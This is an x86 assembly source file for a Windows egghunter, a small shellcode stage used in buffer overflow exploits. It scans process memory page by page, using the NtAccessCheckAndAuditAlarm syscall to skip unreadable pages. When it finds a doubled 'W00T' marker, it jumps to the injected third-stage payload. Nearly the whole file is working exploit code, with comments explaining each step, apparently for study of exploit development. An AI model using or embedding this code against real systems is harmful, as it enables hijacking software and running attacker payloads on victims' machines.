;egghunter.asm

[BITS 32]
[SECTION .text]

global _start

_start:

loop_inc_page:
	; Go to last address in page n (this could also be used to XOR EDX and set the counter to 00000000)
	or dx, 0x0fff

loop_inc_one:
	; Go to first address in page n+1
	inc edx

loop_check:
	; save edx which holds our current memory location
	push edx 		
	; initialize the call to NtAccessCheckAndAuditAlarm 
	push 0x2
	pop eax
	; perform the system call
 	int 0x2e
	; check for access violation, 0xc0000005 (ACCESS_VIOLATION) 
	cmp al,05
	; restore edx to check later the content of pointed address
	pop edx

loop_check_8_valid:
	; if access violation encountered, go to next page
	je loop_inc_page 

is_egg:
	; load egg (W00T in this example)
	mov eax, 0x54303057
	; initializes pointer with current checked address
	mov edi, edx
	; Compare eax with doubleword at edi and set status flags
	scasd
	
	; No match, we will increase our memory counter by one 
	jnz loop_inc_one
	; first part of the egg detected, check for the second part
	scasd
	; No match, we found just a location with half an egg
	jnz loop_inc_one

matched:
	; edi points to the first byte of our 3rd stage code, let's go!
	jmp edi 

